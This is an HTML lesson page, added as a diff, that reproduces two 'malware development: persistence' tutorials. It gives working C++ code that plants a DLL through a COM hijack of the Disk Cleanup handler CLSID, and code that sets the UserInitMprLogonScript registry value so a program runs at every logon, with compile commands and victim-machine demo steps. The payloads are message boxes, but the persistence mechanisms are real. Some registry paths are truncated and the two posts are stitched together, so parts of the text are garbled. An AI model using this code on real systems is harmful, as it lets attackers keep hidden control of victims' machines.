@@ -1,0 +1,205 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Malware development: persistence - part 19. Disk Cleanup</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #42</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Malware development: persistence - part 19. Disk Cleanup</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Utility. Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This post is based on my own research into one of the more interesting malware persistence tricks: via Disk Cleanup Utility. disk cleanup If you have ever had an issue with limited hard disk space, you are certainly familiar with the Disk Cleanup utility:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Good news for red teamers, the “Files to delete” list displayed in the user interface is not random. Just run command:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\VolumeCache</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, there are even default values of registry keys here.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Also, if we have HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\default=<CL we can find another registry key value: HKCR\CLSID\<CLSID>\InProcServer32 = <DLLPATH>:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">For demo purposes, here I show the example of the registry from HKEY_CLASSES_ROOT because HKEY_CURRENT_USER is empty This suggests, that we can use COM DLL hijacking for persistence. Let’s try.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">First of all, as usually, create “evil” DLL (hack.cpp):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+hack.cpp
+simple DLL
+author: @cocomelonc
+https://cocomelonc.github.io/persistence/2022/11/16/malware-pers-19.html
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason,
+LPVOID lpReserved) {
+switch (nReason) {
+case DLL_PROCESS_ATTACH:
+
+MessageBox(
+NULL,
+"Meow-meow!",
+"=^..^=",
+MB_OK
+);
+break;
+case DLL_PROCESS_DETACH:
+break;
+case DLL_THREAD_ATTACH:
+break;
+case DLL_THREAD_DETACH:
+break;
+}
+return TRUE;
+}
+As usually, for simplicity, it’s just meow-meow messagbox.
+And then create persistence script (pers.cpp):
+/*
+pers.cpp
+windows persistence via Disk Cleaner
+author: @cocomelonc
+https://cocomelonc.github.io/persistence/2022/11/16/malware-pers-19.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+#include &lt;cstdio&gt;
+int main(int argc, char* argv[]) {
+HKEY hkey = NULL;
+// subkey
+const char* sk =
+"Software\\Classes\\CLSID\\{8369AB20-56C9-11D0-94E8-00AA0059CE02}
+\\InprocServer32";
+// malicious DLL
+const char* dll = "Z:\\2022-11-16-malware-pers-19\\hack.dll";
+// startup
+LONG res = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR)sk, 0, NULL,
+REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &amp;hkey, NULL);
+if (res == ERROR_SUCCESS) {
+// create new registry keys
+
+RegSetValueEx(hkey, NULL, 0, REG_SZ, (unsigned char*)dll, strlen(dll));
+RegCloseKey(hkey);
+} else {
+printf("cannot create subkey value :(\n");
+return -1;
+}
+return 0;
+}
+As CLSID I took 8369AB20-56C9-11D0-94E8-00AA0059CE02. As you can see code
+is similar to COM hijacking post. The difference is only in the values of the variables.
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to compile our evil DLL:</p>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">x86_64-w64-mingw32-gcc -shared -o hack.dll hack.cpp</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And persistence script: x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \ -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections \ -Wno-write-strings -fno-exceptions -fmerge-all-constants \ -static-libstdc++ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Copy to victim’s machine. In my case Windows 10 x64. Run: reg query "HKCU\Software\Classes\CLSID\{8369AB20-56C9-11D0-94E8-00AA0059CE02}" /s .\pers.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, everything is worked perfectly! =.. = But for persistence. requires the user to run Disk Cleanup Utility. Here, I can use one of the classic trick for persistence. Adding Disk Cleanup to run during the start-up may not be the best idea, because it has a GUI. I tried using the command line arguments of this program: cleanmgr.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">cleanmgr.exe /cleanup cleanmgr.exe /autoclean cleanmgr.exe /setup But failed :(. It worked correctly:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">I think I will return to this issue in one of the future posts.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Also, according to microsoft documentation, we can add new entries to: HKLM\SOFTWARE\Microsoft\Windows\Current I don’t know if any APT in the wild used this tactic and trick, but, I hope this post spreads awareness to the blue teamers of this interesting technique especially when create software, and adds a weapon to the red teamers arsenal. MSDN Registering Disk Cleanup Handler DLL hijacking DLL hijacking with exported functions Malware persistence: part 1 Malware persistence: part 3 source code in github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">86. malware development: persistence - part 20. UserInitMprLogonScript (Logon Script). Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This post is based on my own research into one of the more interesting malware persistence tricks: via UserInitMprLogonScript value. UserInitMprLogonScript Windows enables the execution of logon scripts whenever a user or group of users logs into a system. Adding a script’s path to the HKCU\Environment\UserInitMprLogonScript Registry key accomplishes this. So, to establish persistence, hackers may utilize Windows logon scripts automatically executed upon logon initialization.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to look at a practical example. First of all, as usually, create “evil” application. For simplicity, as usually, it’s meow-meow messagebox application (hack.cpp):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+hack.cpp
+evil app for windows persistence
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2022/12/09/malware-pers-20.html
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR
+lpCmdLine, int nCmdShow) {
+MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
+
+return 0;
+}
+And, then just create persistence script (pers.cpp):
+/*
+pers.cpp
+windows persistence via
+setting UserInitMprLogonScript value
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2022/12/09/malware-pers-20.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+int main(int argc, char* argv[]) {
+HKEY hkey = NULL;
+// env
+const char* env = "Environment";
+// evil app
+const char* exe = "Z:\\2022-12-09-malware-pers-20\\hack.exe";
+// environment
+LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)env, 0 , KEY_WRITE,
+&amp;hkey);
+if (res == ERROR_SUCCESS) {
+// update registry key value
+// reg add "HKEY_CURRENT_USER\Environment" /v "UserInitMprLogonScript" /t
+// REG_SZ /d "...\hack.exe" /f
+RegSetValueEx(hkey, (LPCSTR)"UserInitMprLogonScript", 0, REG_SZ,
+(unsigned char*)exe, strlen(exe));
+RegCloseKey(hkey);
+}
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, the logic is simple. Just set UserInitMprLogonScript key value under HKCU\Environment to the full path of our “malware” Z:\\2022-12-09-malware-pers-20\hack.exe.</p>
+
+            <div id="demo" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Demo</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. First of all, check Registry: reg query "HKCU\Environment" /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, compile our “malware” at the attacker’s machine (kali): x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \ -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And for checking correctness, try to run hack.exe at the victim’s machine (Windows 10 x64 in my case): .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, our “malware” works perfectly. At the next step, let’s go to compile our persistence script at the attacker’s machine: x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \ -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And run it at the attacker’s machine: .\pers.exe Then, check our Registry key values again: reg query "HKCU\Environment" /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, as you can see, the key (UserInitMprLogonScript) value is set. That’s all. Try to logout and login:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And after a few milliseconds, our “malware”, meow-meow popped up:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, if we open Process Hacker and check hack.exe properties:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">we see that the parent process is “non-existent” process. If you have studied the windows internals at least a little, you know that exists processes which have “non-existent” process as parent. For example, Windows Explorer - explorer.exe. Parent process is userinit.exe or winlogon.exe, but can be anything .exe using explorer.exe. Parent will show as <Non-existent Process> since userinit.exe terminates itself. Another example is Windows Logon</p>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>winlogon.exe. Parent is “does not exist” since smss.exe exits.</span></div></div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">If we check hack.exe properties via Sysinternals Process Explorer, we can see “Autostart Location” value:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Everything is worked perfectly! =.. = After the end of experiment, delete the key: Remove-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript"</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This persistence trick is used by APT28 group and software like Attor and Zebrocy at the wild. I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. Sysinternals Process Explorer Malware persistence: part 1 APT28</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Attor Zebrocy (Trojan) source code in github</p></main></body></html>
